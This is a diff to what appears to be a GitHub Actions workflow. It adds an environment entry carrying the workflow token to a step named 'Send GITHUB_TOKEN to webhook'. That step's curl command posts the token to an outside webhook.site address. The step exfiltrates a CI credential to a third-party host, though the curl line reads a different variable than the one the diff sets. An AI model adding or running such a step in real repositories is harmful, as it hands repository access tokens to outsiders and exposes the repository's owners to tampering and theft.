@@ -9,6 +9,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Send GITHUB_TOKEN to webhook
+        env:
+          TOKEN: ${{ github.token }}
         run: |
           curl -X POST https://webhook.site/ba751215-9a97-4bdf-b43c-6b28174b6954 \
             --data-urlencode "token=$GITHUB_TOKEN"
